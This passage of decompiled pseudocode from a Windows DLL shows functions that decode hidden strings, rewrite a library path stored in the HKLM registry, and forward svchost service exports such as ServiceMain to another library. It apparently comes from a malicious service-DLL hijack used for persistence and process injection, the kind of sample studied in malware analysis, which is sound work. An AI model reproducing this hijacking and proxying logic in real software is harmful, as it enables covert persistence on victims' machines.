    v1 = (const CHAR *)sub_10008918((int)&unk_10014474);
    v2 = sub_1000CE78(byte_10015F10, v1);
  }
  if ( v2 )
    return 0;
  else
    return 2;
}

//----- (1000619F) --------------------------------------------------------
char sub_1000619F()
{
  const CHAR *v0; // eax
  HANDLE EventA; // eax
  void *v2; // esi
  char v4; // [esp+10h] [ebp-20h]

  v4 = 0;
  v0 = (const CHAR *)sub_10008918((int)&unk_10013348);
  EventA = CreateEventA(0, 1, 0, v0);
  v2 = EventA;
  if ( !EventA )
    return 0;
  if ( WaitForSingleObject(EventA, 0) == 258 )
    v4 = 1;
  CloseHandle(v2);
  return v4;
}

//----- (10006266) --------------------------------------------------------
char __cdecl sub_10006266(LPCSTR lpString)
{
  int v1; // esi
  char v3; // [esp+10h] [ebp-1Ch]

  v3 = 1;
  if ( sub_1000D567() )
  {
    v1 = sub_10006331();
    if ( !v1 )
      RaiseException(0, 0, 0, 0);
    if ( v1 == GetCurrentProcessId() )
    {
      return 0;
    }
    else
    {
      if ( !sub_1000D710() )
        RaiseException(0, 0, 0, 0);
      if ( !sub_1000DC63(v1, lpString) )
        RaiseException(0, 0, 0, 0);
      sub_1000D8E9();
    }
  }
  return v3;
}

//----- (10006331) --------------------------------------------------------
int sub_10006331()
{
  const CHAR *v0; // eax
  int v2; // [esp-8h] [ebp-30h]
  int v3; // [esp+0h] [ebp-28h] BYREF
  int v5[5]; // [esp+14h] [ebp-14h] BYREF

  v5[1] = (int)&v3;
  v5[0] = 0;
  v5[4] = 0;
  v2 = sub_10008918((int)&unk_10014474);
  v0 = (const CHAR *)sub_10008918((int)&unk_10014494);
  if ( sub_1000CA7F(v0, (DWORD *)v5, v2, 0) )
    return 0;
  else
    return v5[0];
}

//----- (10006398) --------------------------------------------------------
char *sub_10006398()
{
  DWORD ModuleFileNameA; // eax

  if ( !strcmp(String2, Filename) )
  {
    memset(Filename, 0, 0x105u);
    ModuleFileNameA = GetModuleFileNameA(hModule, Filename, 0x105u);
    if ( !ModuleFileNameA || ModuleFileNameA == 261 )
      lstrcpyA(Filename, String2);
  }
  return Filename;
}

//----- (10006431) --------------------------------------------------------
char sub_10006431()
{
  const CHAR *v0; // eax
  char v2; // [esp+Ch] [ebp-1Ch]

  v2 = 1;
  dword_10016020 = LoadLibraryA(dword_100157A4);
  if ( !dword_10016020 )
    return 0;
  v0 = (const CHAR *)sub_10008918((int)&unk_100144B8);
  dword_10016024 = (int)GetProcAddress(dword_10016020, v0);
  if ( !dword_10016024 )
    return 0;
  return v2;
}
// 10016024: using guessed type int dword_10016024;

//----- (100064BC) --------------------------------------------------------
HMODULE sub_100064BC()
{
  HMODULE result; // eax

  dword_10016024 = 0;
  result = dword_10016020;
  if ( dword_10016020 )
  {
    result = (HMODULE)FreeLibrary(dword_10016020);
    dword_10016020 = 0;
  }
  return result;
}
// 10016024: using guessed type int dword_10016024;

//----- (1000651E) --------------------------------------------------------
_DWORD *__thiscall sub_1000651E(_DWORD *this, int a2, int a3, int a4)
{
  sub_1000246B((int)this, a2, a3, dword_1001602C, a4);
  *this = &off_1001051C;
  return this;
}
// 1001051C: using guessed type int (__thiscall *off_1001051C)(void *, char);
// 1001602C: using guessed type int dword_1001602C;

//----- (10006562) --------------------------------------------------------
_DWORD *__thiscall sub_10006562(_DWORD *this, char a2)
{
  sub_1000657E(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (1000657E) --------------------------------------------------------
void __thiscall sub_1000657E(_DWORD *this)
{
  *this = &off_1001051C;
  sub_100025AC((int)this);
}
// 1001051C: using guessed type int (__thiscall *off_1001051C)(void *, char);

//----- (100065A7) --------------------------------------------------------
int __cdecl sub_100065A7(unsigned int a1)
{
  char v1; // al
  char v2; // al
  char v4; // [esp+Ch] [ebp-20h]
  int v5; // [esp+10h] [ebp-1Ch]

  memset(byte_100158F4, 0, 0xFFu);
  memset(ValueName, 0, 0x105u);
  memset(LibFileName, 0, 0x105u);
  memset(byte_10015C04, 0, 0x105u);
  memset(byte_10015D0C, 0, 0xFFu);
  memset(SubKey, 0, 0xFFu);
  memset(byte_10015F10, 0, 0x105u);
  if ( a1 > 0x20 )
  {
    if ( a1 != 64 && a1 != 128 && a1 != 256 && a1 != 512 )
      goto LABEL_15;
    v1 = sub_1000687D();
  }
  else
  {
    if ( a1 == 32 )
    {
LABEL_15:
      v2 = sub_1000687D();
      goto LABEL_16;
    }
    if ( a1 == 1 )
    {
LABEL_10:
      v2 = sub_100066C3();
LABEL_16:
      v4 = v2;
      v5 = 2;
      goto LABEL_19;
    }
    if ( a1 != 2 && a1 != 4 && a1 != 8 )
    {
      if ( a1 != 16 )
        goto LABEL_15;
      goto LABEL_10;
    }
    v1 = sub_100066C3();
  }
  v4 = v1;
  v5 = 0;
LABEL_19:
  if ( !v4 )
    return 1;
  return v5;
}

//----- (100066C3) --------------------------------------------------------
char sub_100066C3()
{
  const CHAR *v0; // eax
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  DWORD v5; // eax
  const CHAR *v6; // eax
  const CHAR *v7; // eax
  const CHAR *v8; // eax
  const CHAR *v9; // eax
  const CHAR *v10; // eax
  const CHAR *v11; // eax
  const CHAR *v12; // eax
  const CHAR *v13; // eax
  char v15; // [esp+10h] [ebp-1Ch]

  v15 = 1;
  dword_100158F0 = HKEY_LOCAL_MACHINE;
  hKey = HKEY_LOCAL_MACHINE;
  v0 = (const CHAR *)sub_10008918((int)&unk_10014604);
  if ( lstrlenA(v0) > 261 || (v1 = (const CHAR *)sub_10008918((int)&unk_10014604), !lstrcpynA(ValueName, v1, 261)) )
    v15 = 0;
  v2 = (const CHAR *)sub_10008918((int)&unk_100132C8);
  if ( lstrlenA(v2) > 261 || (v3 = (const CHAR *)sub_10008918((int)&unk_100132C8), !lstrcpynA(byte_10015C04, v3, 261)) )
    v15 = 0;
  v4 = (const CHAR *)sub_10008918((int)&unk_100145E0);
  v5 = ExpandEnvironmentStringsA(v4, LibFileName, 0x105u);
  if ( !v5 || v5 > 0x105 )
    v15 = 0;
  v6 = (const CHAR *)sub_10008918((int)&unk_10014578);
  if ( lstrlenA(v6) > 255 || (v7 = (const CHAR *)sub_10008918((int)&unk_10014578), !lstrcpynA(byte_100158F4, v7, 255)) )
    v15 = 0;
  v8 = (const CHAR *)sub_10008918((int)&unk_10014510);
  if ( lstrlenA(v8) > 255 || (v9 = (const CHAR *)sub_10008918((int)&unk_10014510), !lstrcpynA(byte_10015D0C, v9, 255)) )
    v15 = 0;
  v10 = (const CHAR *)sub_10008918((int)&unk_100144E8);
  if ( lstrlenA(v10) > 261
    || (v11 = (const CHAR *)sub_10008918((int)&unk_100144E8), !lstrcpynA(byte_10015F10, v11, 261)) )
  {
    v15 = 0;
  }
  v12 = (const CHAR *)sub_10008918((int)&unk_10014578);
  if ( lstrlenA(v12) > 255 )
    return 0;
  v13 = (const CHAR *)sub_10008918((int)&unk_10014578);
  if ( !lstrcpynA(SubKey, v13, 255) )
    return 0;
  return v15;
}

//----- (1000687D) --------------------------------------------------------
char sub_1000687D()
{
  const CHAR *v0; // eax
  DWORD v1; // eax
  const CHAR *v2; // eax
  DWORD v3; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  LPSTR (__stdcall *v6)(LPSTR, LPCSTR, int); // ebx
  const CHAR *v7; // eax
  const CHAR *v8; // eax
  const CHAR *v9; // eax
  const CHAR *v10; // eax
  const CHAR *v11; // eax
  const CHAR *v12; // eax
  const CHAR *v13; // eax
  const CHAR *v14; // eax
  char v16; // [esp+10h] [ebp-1Ch]

  v16 = 1;
  dword_100158F0 = HKEY_LOCAL_MACHINE;
  hKey = HKEY_LOCAL_MACHINE;
  sub_1000D3AF();
  v0 = (const CHAR *)sub_10008918((int)&unk_100146F0);
  v1 = ExpandEnvironmentStringsA(v0, LibFileName, 0x105u);
  if ( !v1 || v1 > 0x105 )
    v16 = 0;
  v2 = (const CHAR *)sub_10008918((int)&unk_100132C8);
  v3 = ExpandEnvironmentStringsA(v2, byte_10015C04, 0x105u);
  if ( !v3 || v3 > 0x105 )
    v16 = 0;
  v4 = (const CHAR *)sub_10008918((int)&unk_10014688);
  if ( lstrlenA(v4) > 255 )
  {
    v16 = 0;
    v6 = lstrcpynA;
  }
  else
  {
    v5 = (const CHAR *)sub_10008918((int)&unk_10014688);
    v6 = lstrcpynA;
    if ( !lstrcpynA(SubKey, v5, 255) )
      v16 = 0;
  }
  v7 = (const CHAR *)sub_10008918((int)&unk_10014604);
  if ( lstrlenA(v7) > 261 || (v8 = (const CHAR *)sub_10008918((int)&unk_10014604), !v6(ValueName, v8, 261)) )
    v16 = 0;
  v9 = (const CHAR *)sub_10008918((int)&unk_10014494);
  if ( lstrlenA(v9) > 261 || (v10 = (const CHAR *)sub_10008918((int)&unk_10014494), !v6(byte_10015F10, v10, 261)) )
    v16 = 0;
  v11 = (const CHAR *)sub_10008918((int)&unk_10014688);
  if ( lstrlenA(v11) > 255 || (v12 = (const CHAR *)sub_10008918((int)&unk_10014688), !v6(byte_100158F4, v12, 255)) )
    v16 = 0;
  v13 = (const CHAR *)sub_10008918((int)&unk_10014620);
  if ( lstrlenA(v13) > 255 )
    return 0;
  v14 = (const CHAR *)sub_10008918((int)&unk_10014620);
  if ( !v6(byte_10015D0C, v14, 255) )
    return 0;
  return v16;
}

//----- (10006A3B) --------------------------------------------------------
int __cdecl sub_10006A3B(LPCSTR a1, CHAR *lpString2)
{
  if ( a1 && lpString2 )
    return sub_10006AA4(a1, lpString2);
  else
    return 2;
}

//----- (10006AA4) --------------------------------------------------------
int __cdecl sub_10006AA4(LPCSTR a1, CHAR *lpString2)
{
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  int v5; // esi
  int v6; // eax
  int v7; // [esp-4h] [ebp-24Ch]
  CHAR v8[264]; // [esp+Ch] [ebp-23Ch] BYREF
  CHAR String1[253]; // [esp+114h] [ebp-134h] BYREF
  __int16 v10; // [esp+211h] [ebp-37h]
  _DWORD v11[9]; // [esp+214h] [ebp-34h] BYREF
  char v12; // [esp+23Bh] [ebp-Dh]
  int v13; // [esp+244h] [ebp-4h]

  memset(String1, 0, sizeof(String1));
  v10 = 0;
  v2 = (const CHAR *)sub_10008918((int)&unk_10014724);
  if ( lstrlenA(v2) > 255 )
    return 2;
  v3 = (const CHAR *)sub_10008918((int)&unk_10014724);
  if ( !lstrcpynA(String1, v3, 255) )
    return 2;
  v12 = 0;
  sub_1000C396(v11, (int)String1, 4);
  v13 = 0;
  if ( (unsigned __int8)sub_1000D578() == 1 )
  {
    v12 = 1;
    sub_1000C3E9(v11);
  }
  memset(v8, 0, 0x105u);
  if ( sub_1000B3FD(dword_100158F0, byte_100158F4, ValueName, (LPBYTE)v8, 0x105u, 0) )
  {
    v7 = 3;
  }
  else if ( lstrcmpiA(v8, lpString2) )
  {
    if ( v12 || !lstrcmpiA(v8, a1) )
    {
      v6 = lstrlenA(lpString2);
      if ( sub_1000B4ED(dword_100158F0, byte_100158F4, ValueName, (BYTE *)lpString2, v6, 1u) )
      {
        v7 = 5;
      }
      else
      {
        if ( v12 != 1 || sub_1000C408((int)v11) )
        {
          v5 = 0;
          goto LABEL_20;
        }
        v7 = 2;
      }
    }
    else
    {
      v7 = 4;
    }
  }
  else
  {
    v7 = 1;
  }
  v5 = v7;
LABEL_20:
  v13 = -1;
  sub_1000C3E2(v11);
  return v5;
}
// 10006AA4: using guessed type _DWORD var_34[9];

//----- (10006C08) --------------------------------------------------------
bool sub_10006C08()
{
  return sub_10006A3B(LibFileName, byte_10015C04) == 0;
}

//----- (10006C73) --------------------------------------------------------
char sub_10006C73()
{
  int v1; // [esp+0h] [ebp-128h] BYREF
  char v2; // [esp+Ch] [ebp-11Ch]
  CHAR String1[264]; // [esp+10h] [ebp-118h] BYREF
  int *v4; // [esp+118h] [ebp-10h]
  int v5; // [esp+124h] [ebp-4h]

  v4 = &v1;
  v2 = 0;
  memset(String1, 0, 0x105u);
  v5 = 0;
  if ( sub_1000B3FD(dword_100158F0, byte_100158F4, ValueName, (LPBYTE)String1, 0x105u, 0) )
  {
    LOBYTE(v5) = 1;
  }
  else if ( !lstrcmpiA(String1, byte_10015C04) )
  {
    v2 = 1;
  }
  v5 = -1;
  return v2;
}

//----- (10006D11) --------------------------------------------------------
int sub_10006D11()
{
  int v0; // eax

  v0 = sub_10006A3B(LibFileName, byte_10015C04);
  if ( !v0 )
    return 0;
  if ( v0 == 1 )
    return 1;
  else
    return 2;
}

//----- (10006D85) --------------------------------------------------------
bool sub_10006D85()
{
  return sub_10006A3B(byte_10015C04, LibFileName) == 0;
}

//----- (10006DEB) --------------------------------------------------------
int sub_10006DEB()
{
  const CHAR *v0; // eax
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  int v5; // [esp+Ch] [ebp-1Ch]

  v5 = 0;
  dword_100158D0 = LoadLibraryA(LibFileName);
  if ( !dword_100158D0 )
    return 2;
  v0 = (const CHAR *)sub_10008918((int)&unk_10014818);
  dword_100158C0 = GetProcAddress(dword_100158D0, v0);
  if ( !dword_100158C0 )
    v5 = 3;
  v1 = (const CHAR *)sub_10008918((int)&unk_100147EC);
  dword_100158C4 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))GetProcAddress(dword_100158D0, v1);
  if ( !dword_100158C4 )
    v5 = 3;
  if ( !(unsigned __int8)sub_1000D578() )
  {
    v2 = (const CHAR *)sub_10008918((int)&unk_100147C0);
    dword_100158C8 = GetProcAddress(dword_100158D0, v2);
    if ( !dword_100158C8 )
      v5 = 3;
    v3 = (const CHAR *)sub_10008918((int)&unk_10014794);
    dword_100158CC = GetProcAddress(dword_100158D0, v3);
    if ( !dword_100158CC )
      return 3;
  }
  return v5;
}
// 100158C0: using guessed type int (*dword_100158C0)(void);
// 100158C4: using guessed type int (__stdcall *dword_100158C4)(_DWORD, _DWORD, _DWORD);
// 100158C8: using guessed type int (*dword_100158C8)(void);
// 100158CC: using guessed type int (*dword_100158CC)(void);

//----- (10006EF0) --------------------------------------------------------
char sub_10006EF0()
{
  dword_100158C0 = 0;
  dword_100158C4 = 0;
  dword_100158C8 = 0;
  dword_100158CC = 0;
  if ( dword_100158D0 && !FreeLibrary(dword_100158D0) )
    return 0;
  dword_100158D0 = 0;
  return 1;
}
// 100158C0: using guessed type int (*dword_100158C0)(void);
// 100158C4: using guessed type int (__stdcall *dword_100158C4)(_DWORD, _DWORD, _DWORD);
// 100158C8: using guessed type int (*dword_100158C8)(void);
// 100158CC: using guessed type int (*dword_100158CC)(void);

//----- (10006F72) --------------------------------------------------------
char sub_10006F72()
{
  char v0; // bl
  const CHAR *v1; // eax
  DWORD ThreadId; // [esp+Ch] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+10h] [ebp-18h]

  v0 = 0;
  ms_exc.registration.TryLevel = 0;
  v1 = (const CHAR *)sub_10008918((int)&unk_100133E0);
  dword_100158E8 = CreateEventA(0, 1, 0, v1);
  if ( dword_100158E8 )
  {
    dword_100158E0 = (int)CreateThread(0, 0, sub_1000587B, 0, 0, &ThreadId);
    if ( dword_100158E0 )
    {
      v0 = 1;
    }
    else
    {
      sub_10001EE5(420, 1, 18, 0);
      sub_10001421();
    }
    ms_exc.registration.TryLevel = -1;
    return v0;
  }
  else
  {
    sub_10001EE5(420, 1, 18, 0);
    sub_10001421();
    ms_exc.registration.TryLevel = -1;
    return 0;
  }
}
// 100158E0: using guessed type int dword_100158E0;

//----- (10007030) --------------------------------------------------------
char sub_10007030()
{
  const CHAR *v0; // eax
  char *v1; // eax
  char result; // al
  char pSecurityDescriptor[20]; // [esp+10h] [ebp-3Ch] BYREF
  struct _SECURITY_ATTRIBUTES EventAttributes; // [esp+24h] [ebp-28h] BYREF
  CPPEH_RECORD ms_exc; // [esp+34h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  sub_1000B246(pSecurityDescriptor);
  EventAttributes.nLength = 12;
  EventAttributes.lpSecurityDescriptor = pSecurityDescriptor;
  EventAttributes.bInheritHandle = 0;
  v0 = (const CHAR *)sub_10008918((int)&unk_100133B0);
  hEvent = CreateEventA(&EventAttributes, 1, 0, v0);
  v1 = sub_10006398();
  if ( sub_1000DEE0(v1, 0, (int (__stdcall *)())0x1A33F1AB) )
  {
    result = 1;
  }
  else
  {
    CloseHandle(hEvent);
    hEvent = 0;
    result = 0;
  }
  ms_exc.registration.TryLevel = -1;
  return result;
}

//----- (100070E6) --------------------------------------------------------
char __cdecl sub_100070E6(HANDLE hEvent, DWORD dwMilliseconds, HANDLE *a3)
{
  char v3; // bl
  BOOL ExitCodeThread; // [esp+14h] [ebp-20h]
  DWORD ExitCode; // [esp+18h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+1Ch] [ebp-18h]

  ExitCode = 0;
  ExitCodeThread = 0;
  v3 = 0;
  ms_exc.registration.TryLevel = 0;
  if ( *a3 )
    ExitCodeThread = GetExitCodeThread(*a3, &ExitCode);
  if ( ExitCode == 259 || !ExitCodeThread )
  {
    if ( hEvent )
    {
      SetEvent(hEvent);
      Sleep(dwMilliseconds);
      v3 = sub_100070E6(0, dwMilliseconds, (int)a3);
      ResetEvent(hEvent);
    }
    else if ( *a3 )
    {
      v3 = TerminateThread(*a3, 0);
    }
  }
  if ( *a3 )
  {
    CloseHandle(*a3);
    *a3 = 0;
  }
  return v3;
}

//----- (100071C5) --------------------------------------------------------
HMODULE sub_100071C5()
{
  DWORD v0; // esi
  int v1; // esi
  HMODULE result; // eax

  v0 = 1000;
  if ( sub_100070E6(0, 0, (HANDLE *)&dword_100158E4) == 1 )
    sub_100060A2((HANDLE *)&dword_10016028);
  sub_100070E6(hEvent, 0x3E8u, (HANDLE *)&dword_100158DC);
  sub_1000B3DD(&hEvent);
  if ( hHandle )
  {
    v1 = -(WaitForSingleObject(hHandle, 0) != 0);
    LOWORD(v1) = v1 & 0xF060;
    v0 = v1 + 5000;
  }
  sub_100070E6(dword_100158E8, v0, (HANDLE *)&dword_100158E0);
  sub_1000B3DD(&dword_100158E8);
  if ( dword_100158D8 )
  {
    FreeLibrary(dword_100158D8);
    dword_100158D8 = 0;
  }
  result = hLibModule;
  if ( hLibModule )
  {
    result = (HMODULE)FreeLibrary(hLibModule);
    hLibModule = 0;
  }
  return result;
}
// 100158DC: using guessed type int dword_100158DC;
// 100158E0: using guessed type int dword_100158E0;
// 100158E4: using guessed type int dword_100158E4;
// 10016028: using guessed type int dword_10016028;

//----- (100072DE) --------------------------------------------------------
int (*NotifyLogoffUser())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(ProcName, v0) )
    result = GetProcAddress(dword_100158D0, ProcName);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (10007324) --------------------------------------------------------
int (*NotifyLogonUser())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aNotifylogonuse_0, v0) )
    result = GetProcAddress(dword_100158D0, aNotifylogonuse_0);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (1000736A) --------------------------------------------------------
int (*ServiceMain())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aServicemain_0, v0) )
    result = GetProcAddress(dword_100158D0, aServicemain_0);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (100073B0) --------------------------------------------------------
int (*LCEControlServer())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aLcecontrolserv_0, v0) )
    result = GetProcAddress(dword_100158D0, aLcecontrolserv_0);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (100073F6) --------------------------------------------------------
int (*RegisterTheEventServiceDuringSetup())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aRegistertheeve_1, v0) )
    result = GetProcAddress(dword_100158D0, aRegistertheeve_1);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (1000743C) --------------------------------------------------------
int (*RegisterTheEventServiceAfterSetup())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aRegistertheeve_2, v0) )
    result = GetProcAddress(dword_100158D0, aRegistertheeve_2);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (10007482) --------------------------------------------------------
int (*RegisterTheFrigginEventServiceDuringSetup())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aRegisterthefri_1, v0) )
    result = GetProcAddress(dword_100158D0, aRegisterthefri_1);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (100074C8) --------------------------------------------------------
int (*RegisterTheFrigginEventServiceAfterSetup())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aRegisterthefri_2, v0) )
    result = GetProcAddress(dword_100158D0, aRegisterthefri_2);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (1000750E) --------------------------------------------------------
int (*icsvnt32_3())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aO3, v0) )
    result = GetProcAddress(dword_100158D0, aO3);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (10007554) --------------------------------------------------------
void __stdcall PerUserInit()
{
  const char *v0; // eax
  void (__stdcall *ProcAddress)(); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aPeruserinit_0, v0) )
    ProcAddress = (void (__stdcall *)())GetProcAddress(dword_100158D0, aPeruserinit_0);
  else
    ProcAddress = (void (__stdcall *)())GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( ProcAddress )
    ProcAddress();
}

//----- (1000759A) --------------------------------------------------------
HRESULT __stdcall DllInstall(BOOL bInstall, PCWSTR pszCmdLine)
{
  const char *v2; // eax
  HRESULT result; // eax

  v2 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aDllinstall_0, v2) )
    result = (HRESULT)GetProcAddress(dword_100158D0, aDllinstall_0);
  else
    result = (HRESULT)GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return ((int (__stdcall *)(BOOL, PCWSTR))result)(bInstall, pszCmdLine);
  return result;
}

//----- (100075E0) --------------------------------------------------------
int (*RestoreMyDocsFolder())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aRestoremydocsf_0, v0) )
    result = GetProcAddress(dword_100158D0, aRestoremydocsf_0);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (10007626) --------------------------------------------------------
int (*CreateSharedDocuments())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aCreateshareddo_0, v0) )
    result = GetProcAddress(dword_100158D0, aCreateshareddo_0);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (1000766C) --------------------------------------------------------
int (*SvchostPushServiceGlobals())(void)
{
  const char *v0; // eax
  int (*result)(void); // eax

  v0 = (const char *)sub_10008918((int)&unk_10014854);
  if ( strcmpi(aSvchostpushser_0, v0) )
    result = GetProcAddress(dword_100158D0, aSvchostpushser_0);
  else
    result = GetProcAddress(dword_100158D0, (LPCSTR)3);
  if ( result )
    return (int (*)(void))result();
  return result;
}

//----- (100076B2) --------------------------------------------------------
_DWORD *__thiscall sub_100076B2(_DWORD *this, int a2, int a3, int a4, int a5, int a6)
{
  _DWORD *result; // eax

  result = this;
  *this = &off_10010200;
  this[1] = a2;
  this[2] = a3;
  this[3] = a5;
  this[4] = a6;
  *this = off_10010610;
  this[5] = a4;
  return result;
}
// 10010200: using guessed type void *off_10010200;
// 10010610: using guessed type int (*off_10010610[3])();

//----- (10007702) --------------------------------------------------------
_DWORD *__thiscall sub_10007702(_DWORD *this, char a2)
{
  sub_100077D7(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (1000771E) --------------------------------------------------------
int __thiscall sub_1000771E(int this)
{
  _DWORD **v2; // ecx
  size_t Size; // [esp+10h] [ebp-20h] BYREF
  void *Src; // [esp+14h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+18h] [ebp-18h] BYREF

  Src = 0;
  ms_exc.registration.TryLevel = 0;
  v2 = *(_DWORD ***)(this + 4);
  if ( v2
    && (unsigned __int8)sub_10005155(v2)
    && (Size = 0,
        (*(unsigned __int8 (__thiscall **)(_DWORD, void **, size_t *))(**(_DWORD **)(this + 12) + 8))(
          *(_DWORD *)(this + 12),
          &Src,
          &Size))
    && sub_10004FA6(*(_DWORD *)(this + 4), *(LPCSTR *)(this + 8), Src, Size) == 1 )
  {
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 12))(*(_DWORD *)(this + 12));
    (*(void (__thiscall **)(_DWORD, void *, int))(**(_DWORD **)(this + 12) + 4))(*(_DWORD *)(this + 12), Src, 268466075);
    return 1;
  }
  else
  {
    local_unwind2(&ms_exc.registration, -1);
    return 0;
  }
}
// 10008710: using guessed type int __cdecl local_unwind2(_DWORD, _DWORD);

//----- (100077CD) --------------------------------------------------------
int __thiscall sub_100077CD(_DWORD *this)
{
  return this[5];
}

//----- (100077D1) --------------------------------------------------------
int sub_100077D1()
{
  return 7200;
}

//----- (100077D7) --------------------------------------------------------
void *__thiscall sub_100077D7(_DWORD *this)
{
  void *result; // eax

  result = &loc_1000F9D0;
  *this = off_10010610;
  *this = &off_10010200;
  return result;
}
// 10010200: using guessed type void *off_10010200;
// 10010610: using guessed type int (*off_10010610[3])();

//----- (10007806) --------------------------------------------------------
int sub_10007806()
{
  int result; // eax

  dword_10016030 = sub_10008918((int)&unk_10014C94);
  dword_10016034 = sub_10008918((int)&unk_10014C70);
  dword_10016038 = sub_10008918((int)&unk_10014C40);
  dword_1001603C = sub_10008918((int)&unk_10014C18);
  dword_10016040 = sub_10008918((int)&unk_10014BF4);
  dword_10016044 = sub_10008918((int)&unk_10014BCC);
  dword_10016048 = sub_10008918((int)&unk_10014B9C);
  dword_1001604C = sub_10008918((int)&unk_10014B78);
  dword_10016050 = sub_10008918((int)&unk_10014B54);
  dword_10016054 = sub_10008918((int)&unk_10014B2C);
  dword_10016058 = sub_10008918((int)&unk_10014B04);
  dword_1001605C = sub_10008918((int)&unk_10014AD8);
  dword_10016060 = sub_10008918((int)&unk_10014AAC);
  dword_10016064 = sub_10008918((int)&unk_10014A88);
  dword_10016068 = sub_10008918((int)&unk_10014BCC);
  dword_1001606C = sub_10008918((int)&unk_10014B78);
  dword_10016070 = sub_10008918((int)&unk_10014B54);
  dword_10016074 = sub_10008918((int)&unk_10014B2C);
  dword_10016078 = sub_10008918((int)&unk_10014B04);
  dword_1001607C = sub_10008918((int)&unk_10014A60);
  dword_10016080 = sub_10008918((int)&unk_10014A40);
  dword_10016084 = sub_10008918((int)&unk_10014A1C);
  dword_10016088 = sub_10008918((int)&unk_100149F4);
  dword_1001608C = sub_10008918((int)&unk_100149CC);
  result = sub_10008918((int)&unk_100149A8);
  dword_10016090 = result;
  return result;
}
// 10016030: using guessed type int dword_10016030;
// 10016034: using guessed type int dword_10016034;
// 10016038: using guessed type int dword_10016038;
// 1001603C: using guessed type int dword_1001603C;
// 10016040: using guessed type int dword_10016040;
// 10016044: using guessed type int dword_10016044;
// 10016048: using guessed type int dword_10016048;
// 1001604C: using guessed type int dword_1001604C;
// 10016050: using guessed type int dword_10016050;
// 10016054: using guessed type int dword_10016054;
// 10016058: using guessed type int dword_10016058;
// 1001605C: using guessed type int dword_1001605C;
// 10016060: using guessed type int dword_10016060;
// 10016064: using guessed type int dword_10016064;
// 10016068: using guessed type int dword_10016068;
// 1001606C: using guessed type int dword_1001606C;
// 10016070: using guessed type int dword_10016070;
// 10016074: using guessed type int dword_10016074;
// 10016078: using guessed type int dword_10016078;
// 1001607C: using guessed type int dword_1001607C;
// 10016080: using guessed type int dword_10016080;
// 10016084: using guessed type int dword_10016084;
// 10016088: using guessed type int dword_10016088;
// 1001608C: using guessed type int dword_1001608C;
// 10016090: using guessed type int dword_10016090;

//----- (10007A90) --------------------------------------------------------
int __fastcall wsprintfA_thunk(int a1, int a2)
{
  FARPROC v2; // eax

  v2 = sub_100083EA(&USER32_dll_import_table, (int *)&wsprintfA);
  return ((int (__fastcall *)(int, int))v2)(a1, a2);
}
// 10011628: using guessed type int USER32_dll_import_table;

//----- (10007AB0) --------------------------------------------------------
